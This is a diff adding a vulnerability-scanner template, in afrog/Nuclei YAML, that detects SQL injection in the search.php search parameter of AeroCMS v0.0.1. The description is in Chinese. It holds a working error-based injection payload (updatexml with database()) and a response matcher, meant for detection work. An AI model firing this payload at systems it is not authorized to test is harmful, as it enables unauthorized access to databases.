@@ -1,0 +1,27 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: search=%1'and updatexml(1,concat(0x7e,database(),0x7e),0)#
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ~aerocms~
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/search.php'
+id: aero-cms-front-end-search-function-sql-Injection
+info:
+  author: daffainfo
+  description: AeroCMS v0.0.1发现可以通过search.php文件中的search参数进行sql注入。该漏洞允许攻击者在未经身份验证的情况下获得数据库管理员权限并访问数据库信息。
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: AeroCMS v0.0.1 前端搜索功能sql注入漏洞
+  severity: high
+  tags: aero,sqli,argus-import
